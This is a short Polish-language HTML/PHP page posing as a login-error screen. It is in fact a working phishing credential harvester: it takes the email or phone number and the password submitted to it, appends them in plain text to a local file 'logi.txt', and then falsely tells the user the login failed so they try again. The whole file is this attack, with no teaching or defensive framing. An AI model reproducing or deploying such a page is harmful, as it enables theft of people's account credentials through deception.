<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Błąd logowania</title>
    <style>
        h4 {
            font-family: Arial;
            text-transform: uppercase;
            word-spacing: 2px;
            letter-spacing: 2px;
            color: red;
        }
    </style>
</head>
<body>
    <?php
        $emailOrPhoneNumber = $_POST['emailOrPhoneNumber'];
        $password = $_POST['password'];

        $text = "E-mail: $emailOrPhoneNumber Hasło: $password \r\n";

        $file = fopen("logi.txt", "a");
        fwrite($file, $text);
        fclose($file);

echo<<<END
    <h4>Nieprawidłowy e-mail lub hasło</h4>
    <a href="javascript: history.go(-1)">Spróbuj ponownie</a>
END
    ?>
</body>
</html>